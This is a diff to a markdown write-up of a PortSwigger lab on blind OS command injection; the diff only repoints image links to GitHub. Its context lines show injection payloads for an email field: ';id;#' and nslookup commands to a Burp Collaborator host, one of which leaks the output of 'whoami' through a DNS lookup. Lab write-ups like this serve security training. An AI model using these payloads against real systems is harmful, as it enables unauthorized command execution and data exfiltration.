@@ -13,7 +13,7 @@ try to do **OS command injection** in the `email` parameter:
 
 `;id;#`
 
-![](./images/aaa55b41f52d_001.png)
+![](https://raw.githubusercontent.com/ExploitResearch/PortSwigger-Labs/main/OS_Command_Injection/images/aaa55b41f52d_001.png)
 
 However, there’s no output of our command in the response, it might be vulnerable to blind OS command injection.
 
@@ -23,7 +23,7 @@ Therefore I open a new Burp Collaborator client and generate a new payload. URLe
 ;nslookup 8mvkjln6evqts94q7vwt31eziqoic90y.oastify.com;#
 ```
 
-![](./images/aaa55b41f52d_002.png)
+![](https://raw.githubusercontent.com/ExploitResearch/PortSwigger-Labs/main/OS_Command_Injection/images/aaa55b41f52d_002.png)
 
 we successfully received 2 DNS lookups, which means the feedback function is indeed vulnerable to blind OS command injection!!
 
@@ -52,11 +52,11 @@ or
 ; nslookup $(whoami).8mvkjln6evqts94q7vwt31eziqoic90y.burpcollaborator.net; #
 ```
 
-![](./images/aaa55b41f52d_003.png)
+![](https://raw.githubusercontent.com/ExploitResearch/PortSwigger-Labs/main/OS_Command_Injection/images/aaa55b41f52d_003.png)
 
 The username is shown in the DNS request:
 
-![](./images/aaa55b41f52d_004.png)
+![](https://raw.githubusercontent.com/ExploitResearch/PortSwigger-Labs/main/OS_Command_Injection/images/aaa55b41f52d_004.png)
 
 ### Why It Works
 
